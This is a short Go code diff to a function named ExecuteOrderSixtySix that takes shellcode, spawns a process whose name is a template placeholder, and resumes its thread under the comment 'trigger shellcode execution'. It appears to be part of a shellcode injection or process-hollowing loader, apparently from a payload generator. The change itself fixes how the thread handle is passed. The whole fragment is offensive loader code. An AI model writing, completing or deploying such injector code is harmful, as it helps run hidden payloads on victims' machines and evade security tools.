@@ -90,8 +90,8 @@ func ExecuteOrderSixtySix(shellcode []byte) {
     processName := "%s"
     process := createProcess(processName)
     pHandle := uintptr(process.Process)
+    tHandle := uintptr(process.Thread)
 
-	processInfo := &syscall.ProcessInformation{}
 	pointerSize := unsafe.Sizeof(uintptr(0))
 	basicInfo := &PROCESS_BASIC_INFORMATION{}
 	unusedTmpValue := 0
@@ -174,7 +174,7 @@ func ExecuteOrderSixtySix(shellcode []byte) {
     }
 
     /* trigger shellcode execution */
-	r, _, err = resumeThread.Call(uintptr(processInfo.Thread)); if r == 0 {
+	r, _, err = resumeThread.Call(tHandle); if r == 0 {
         panic(err)
     }
 }
